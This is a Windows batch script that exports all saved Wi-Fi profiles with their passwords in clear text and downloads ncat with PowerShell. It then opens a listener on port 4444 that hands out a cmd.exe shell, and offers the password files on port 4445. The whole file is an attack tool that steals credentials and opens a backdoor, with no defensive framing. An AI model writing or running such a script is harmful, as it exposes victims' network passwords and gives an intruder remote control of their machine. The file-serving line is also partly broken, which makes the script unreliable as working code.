@echo off

:: Export Wi-Fi profiles with clear keys
netsh wlan export profile key=clear folder="%USERPROFILE%\Desktop"

:: Download Netcat
powershell -Command "Invoke-WebRequest 'https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe' -OutFile ncat.exe"

:: Open a listener in a blind shell
start /b ncat -l -p 4444 -e cmd.exe

:: Send Wi-Fi password file to listener
start /b ncat -l -p 4445 < "%USERPROFILE%\Desktop\Wi-Fi-*.xml"

pause
